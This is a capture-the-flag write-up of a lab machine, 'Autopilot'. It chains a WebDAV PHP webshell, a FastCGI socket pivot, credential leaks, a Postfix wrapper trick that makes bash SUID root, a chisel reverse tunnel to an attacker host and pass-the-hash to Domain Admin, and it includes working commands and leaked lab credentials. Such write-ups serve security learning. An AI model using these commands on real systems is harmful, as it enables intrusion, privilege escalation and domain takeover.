---
doc_kind: writeup
title: "HTB Autopilot (Insane) - Grommunio Webshell to FastCGI Pivot to Postfix SUID Root to AD DA"
category: misc
slug: htb-autopilot-grommunio-fastcgi-postfix-suid-ad
created: 2026-10-25
status: solved
tags:
  - grommunio
  - webdav
  - world-readable-data-dir
  - fastcgi
  - php-fpm
  - world-writable-socket
  - config-leak
  - admin-api
  - dbconf
  - postfix-multi-instance-wrapper
  - suid
  - iptables-uid-bypass
  - chisel
  - pass-the-hash
source: "HTB Season 12 (Insane)"
target: "autopilot.htb (grommunio webmail, dual-homed to internal AD 172.16.20.0/24)"
---
# HTB Autopilot (Insane) - Grommunio Webshell to FastCGI Pivot to Postfix SUID Root to AD DA

## Challenge Summary

- Source: HTB Season 12, "Autopilot" (Insane), solved by the user, writeup dated 18/10/2026
- Target: `10.129.19.186` / `autopilot.htb` — grommunio webmail (Linux) dual-homed onto an internal AD network `172.16.20.0/24`
- Goal: Linux user flag + full compromise of the internal Active Directory domain (root-equivalent "flag")

## Initial Signals

- Entry point: only `443/tcp` (nginx) open — full port scan confirms no SSH/SMB/WinRM exposed on the Linux side; everything goes through the web app.
- Visible hints: the TLS cert's SAN leaks internal vhosts (`grommunio.autopilot.htb`, `autodiscover.autopilot.htb`, `mail.autopilot.htb`) not otherwise advertised — add them to `/etc/hosts` to reach the real app routes.
- First confirming probe: lab-provided credentials (`deborah.hernandez`) work on both the grommunio webmail (`/web/login`, 303 redirect = success) and a Nextcloud-like file backend (`/files/`) — same LDAP-backed directory serves both.

## Exploit Chain

1. **Web RCE as `grofiles`.** The Nextcloud-style data repository is served **directly by nginx** at `/files/data/<user>/files/...`, mirroring the on-disk path, and bypasses the Nextcloud PHP controller entirely. A WebDAV `PUT` (`/remote.php/dav/files/deborah.hernandez/shell.php`) writes a PHP webshell into that directory; since nginx serves the file raw (not through the app), it actually gets interpreted, yielding command execution as `grofiles` (uid 462).
2. **Pivot to `gromox` via a 0666 php-fpm socket.** `grofiles` can list `/run/php-fpm/` and finds `php-gromox-fpm.sock` with mode `0666` — a FastCGI pool socket any local user can connect to, where scripts execute as the pool's owner (`gromox`, uid 475). A hand-rolled FastCGI client (pure PHP) connects to the socket and requests execution of a world-readable payload script (`/tmp/x.php`, `chmod 0644` — the webshell's `grofiles` owner wrote it, but the `gromox` worker must be able to read it). See "Key Evidence" for the `BEGIN_REQUEST` framing bug that silently breaks naive clients.
3. **Config leak.** As `gromox` (member of group `gromoxcf`), `/etc/gromox/ldap_adaptor.cfg` and `/etc/gromox/mysql_adaptor.cfg` are readable, yielding LDAP bind creds (`svc_ldap` / `Brother6-Let-Ship-Been-Take`) and MySQL creds (`grommunio` / `gDq6z9YVe4nyNRe5`).
4. **Admin-API takeover.** Using the MySQL credentials, the `admin` user's password hash in the `grommunio` database's `users` table is overwritten with a self-chosen SHA-512-crypt hash. This logs in to the **local-only** admin-api (`127.0.0.1:8080`), obtaining CSRF token + JWT with full administrative API access.
5. **Root via Postfix's `multi_instance_wrapper`.** The admin-api's `dbconf` endpoint manages Postfix config via `PUT` + a "commit" step that is supposed to apply hooks read from the `configs` table (not `DBConf`, a naming trap). With no rows present for `service='grommunio-dbconf', file='postfix'`, `commit()` silently returns `None` and the API reports success while doing nothing. Inserting the expected hook rows (`commit_key`/`commit_file`/`commit_service`) makes commits actually apply. A **single** `PUT` (two `PUT`s to the same file overwrite each other — file-level `PUT` replaces *all* keys for that file) sets both `multi_instance_directories` and `multi_instance_wrapper` to `/usr/bin/chmod u+s /usr/bin/bash`. Postfix's master process (root) runs this wrapper at startup/reload — restarting the service via the admin-api yields a SUID root bash.
6. **AD pivot via a root-only tunnel.** The host is dual-homed onto `172.16.20.0/24`, but iptables only permits new outbound connections to that network from **uid 0**. Launching a `chisel` reverse-SOCKS client via the SUID bash (preserving `euid=0`) opens a SOCKS proxy back to the attacker, proven live by `proxychains4 nc -zv 172.16.20.15 445` succeeding (it would silently fail under any non-root uid).
7. **Pass-the-hash to Domain Admin.** A harvested NTLM hash for `autopilot.htb\Administrator` works directly via WinRM on the DC (`DC01`, `172.16.20.1`) through the SOCKS tunnel — `nxc winrm ... -H <hash>` reports `Pwn3d!`. `nxc winrm -x` returns empty output on this Windows Server 2025 build (a tooling bug, not a privilege issue); `evil-winrm` fed over stdin works reliably instead, read inside a bounded retry loop to ride out the tunnel's frequent (18-90s) drops.

## Key Evidence

- `/run/php-fpm/php-gromox-fpm.sock` mode `0666` (`srw-rw-rw-`) — any local user can FastCGI-request code execution as the pool's configured user.
- **FastCGI `BEGIN_REQUEST` must be exactly 8 bytes** (`roleB0 | flags | 5 reserved bytes` = `n:2 + 1 + 5`). A 7-byte version (`pack('n',1).chr(0).str_repeat("\0",4)`) makes php-fpm silently drop the record — no error, no output, total silence, which is easy to misread as "the socket doesn't work" rather than "the framing is off by one byte."
- `dbconf.commit()` reads its hooks from table `configs`, **not** `DBConf` — an empty result set for the target service/file makes it return `None` silently; the API still reports "Configuration updated" even though nothing executed.
- A file-level `PUT` on the dbconf endpoint **replaces the entire key set for that file** — sending `multi_instance_directories` and `multi_instance_wrapper` in two separate `PUT`s causes the second to wipe out the first; both must go in one request.
- `proxychains4 nc -zv 172.16.20.15 445` succeeding is the concrete proof the chisel tunnel is actually running as uid 0 (iptables blocks `NEW` to that subnet for any other uid, silently).

## Dead Ends

- Hardcoding `3` as a file descriptor, or assuming SMB tooling works once uid 0 is reached: irrelevant here, but general care taken around assuming tool output is trustworthy — `nxc winrm -x` returned **empty command output** on this Windows Server 2025 build despite the auth itself succeeding; wasted effort would go into "fixing" a nonexistent privilege problem instead of switching tools. `evil-winrm` via stdin is the working fallback.
- The chisel tunnel sessions reliably dropped after 18-90 seconds (`Stream error: ssh: unexpected packet...`) — repeatedly relaunching naively wastes time; the fix was `--keepalive 10s` plus a short retry-window strategy (poll port 5985, fire the command the instant it responds) rather than trying to keep one long-lived session open.
- The SUID bit set on `/usr/bin/bash` is **not reversible** on this box because `/usr` is mounted read-only (XFS) — cleanup could only restore the database/config state, not strip the SUID bit; worth flagging explicitly as a non-reversible artifact in any similar engagement.

## Payloads And Commands

```bash
# WebDAV webshell drop (exploits nginx serving /files/data/ raw, bypassing the Nextcloud PHP controller)
curl -sk -u 'deborah.hernandez:<pw>' -X PUT \
  --data-binary '<?php system($_GET["cmd"]); ?>' \
  'https://autopilot.htb/remote.php/dav/files/deborah.hernandez/shell.php'
curl -sk 'https://autopilot.htb/files/data/deborah.hernandez/files/shell.php?cmd=id'
```

```php
<?php
// Minimal FastCGI client — the 8-byte BEGIN_REQUEST is the one thing that must be exact.
fcgi($fp, 1, pack('n', 1) . chr(0) . str_repeat("\0", 5)); // BEGIN_REQUEST, 8 bytes total
```

```bash
# Postfix multi_instance_wrapper SUID trick, after inserting hooks into `configs`
curl -sk -b /tmp/cj -X PUT 'http://127.0.0.1:8080/api/v1/system/dbconf/postfix/main.cf/' \
  -H "X-CSRF-TOKEN: $CSRF" -H 'Content-Type: application/json' \
  -d '{"multi_instance_directories":"/etc/postfix","multi_instance_wrapper":"/usr/bin/chmod u+s /usr/bin/bash"}'
curl -sk -b /tmp/cj -X POST 'http://127.0.0.1:8080/api/v1/system/dashboard/services/postfix.service/restart'
```

```bash
# Root-only AD tunnel + pass-the-hash
/usr/bin/bash -p -c 'setsid /tmp/g2 client --keepalive 10s <attacker>:9001 R:socks > /tmp/.c.log 2>&1 < /dev/null &'
proxychains4 -q nxc winrm 172.16.20.1 -u Administrator -H <nt_hash>   # -> Pwn3d!
```

## Flag / Outcome

- User flag (`/root/user.txt`, Linux side — no `root.txt` exists locally, root equivalence is the AD compromise): `89e8b6324df4e259a08ddb531c10eed4`
- Domain Administrator flag (`C:\Users\Administrator\Desktop\root.txt` on `DC01`): `ece6c32e1673260b587e22bf0d6783b7`

## Reusable Lessons

- A storage backend served directly by the front-end web server (nginx mirroring a Nextcloud-style data path) can let an uploaded file execute even when the "real" application controller would have blocked it — always check whether a data directory is reachable without going through the app's own PHP handler.
- A world-writable (`0666`) FastCGI pool socket is a direct privilege pivot to that pool's user — no HTTP front-end required, just a raw FastCGI client; get the 8-byte `BEGIN_REQUEST` framing exactly right or the socket will appear completely dead.
- When an admin API reports success but nothing actually happens, check whether it reads hook/trigger configuration from a *different* table than the one being edited (here: `configs` vs `DBConf`) before concluding the endpoint itself is broken.
- A `PUT`-based "file-level" config endpoint that replaces the entire file's keys on every call means multiple desired directives must be sent together in one request, not sequentially.
- iptables rules scoped to `uid 0` for egress to a sensitive network are a strong signal that a tunnel/pivot binary must be launched via a SUID shell (or other root-preserving mechanism) rather than as the compromised service account directly — verify with a cheap reachability probe (e.g. `nc -zv` to a known internal port) rather than assuming the tunnel itself is broken.
- When one WinRM tool's command-output capture misbehaves on a specific OS build, switch tools (e.g. `evil-winrm` via stdin) rather than assuming the underlying access is invalid.

## Pattern Candidates

- New pattern created: `knowledge/patterns/misc/php-fpm-0666-socket-fastcgi-pivot.md`
